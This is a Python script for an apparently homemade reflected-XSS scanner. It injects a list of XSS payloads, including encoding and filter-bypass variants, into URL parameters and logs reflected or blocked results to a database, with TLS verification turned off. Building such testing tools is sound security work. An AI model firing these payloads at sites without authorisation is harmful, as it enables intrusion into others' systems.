# ================= IMPORTS =================
import requests
import uuid
import urllib.parse
import time
import sqlite3
from datetime import datetime


# ================= DATABASE =================
DB_PATH = "users.db"

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def save_vulnerability(scan_id, full_url, param, payload, behavior, risk):
    db = get_db()
    db.execute("""
        INSERT INTO vulnerabilities
        (scan_id, target, parameter, payload, behavior, risk, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (
        scan_id,
        full_url,
        param,
        payload,
        behavior,
        risk,
        datetime.utcnow().isoformat()
    ))
    db.commit()
    db.close()


# ================= XSS PAYLOADS =================
XSS_PAYLOADS = [
    # Basic
    "<script>alert('{token}')</script>",
    "<img src=x onerror=alert('{token}')>",
    "<svg/onload=alert('{token}')>",

    # HTML / Attribute context
    "\"><script>alert('{token}')</script>",
    "'><script>alert('{token}')",
    "\" onmouseover=alert('{token}') x=\"",
    "' onmouseover=alert('{token}') x='",

    # JavaScript context
    "';alert('{token}');//",
    "\";alert('{token}');//",

    # Encoded / Bypass
    "%3Cscript%3Ealert('{token}')%3C%2Fscript%3E",
    "%3Csvg%2Fonload%3Dalert('{token}')%3E",
    "%253Cscript%253Ealert('{token}')%253C%252Fscript%253E",
    "&lt;script&gt;alert('{token}')&lt;/script&gt;",
    "\\u003cscript\\u003ealert('{token}')\\u003c/script\\u003e",

    # Filter bypass tricks
    "<scr<script>ipt>alert('{token}')</scr<script>ipt>",
    "<img/src=x/onerror=alert('{token}')>"
]


# ================= MAIN SCAN FUNCTION =================
def run_xss_scan(scan_id, base_url):
    print("🚀 Scan started:", scan_id)

    time.sleep(2)  # UX delay

    hits = 0
    final_risk = "Low"

    parameters = ["q", "search", "id"]
    headers = {"User-Agent": "Remonixa-Scanner/1.0"}

    try:
        for param in parameters:
            for payload_template in XSS_PAYLOADS:

                token = str(uuid.uuid4())
                payload = payload_template.replace("{token}", token)
                encoded_payload = urllib.parse.quote(payload)

                test_url = f"{base_url}?{param}={encoded_payload}"
                print("Testing:", test_url)

                try:
                    response = requests.get(
                        test_url,
                        headers=headers,
                        timeout=8,
                        verify=False
                    )

                    time.sleep(0.3)

                    if token in response.text:
                        hits += 1
                        final_risk = "High"

                        save_vulnerability(
                            scan_id=scan_id,
                            full_url=test_url,
                            param=param,
                            payload=payload,
                            behavior="Reflected",
                            risk="High"
                        )

                    elif response.status_code in [403, 406]:
                        hits += 1
                        if final_risk != "High":
                            final_risk = "Medium"

                        save_vulnerability(
                            scan_id=scan_id,
                            full_url=test_url,
                            param=param,
                            payload=payload,
                            behavior="Blocked",
                            risk="Medium"
                        )

                except requests.exceptions.RequestException:
                    continue

    except Exception as e:
        print("❌ Scan error:", e)

    # ✅ THIS PART FIXES YOUR PENDING ISSUE
    db = get_db()
    db.execute("""
        UPDATE scans
        SET total_vulns = ?,
            risk_level = ?,
            status = ?
        WHERE id = ?
    """, (
        hits,
        final_risk,
        "Completed",
        scan_id
    ))
    db.commit()
    db.close()

    print("✅ Scan completed:", scan_id)
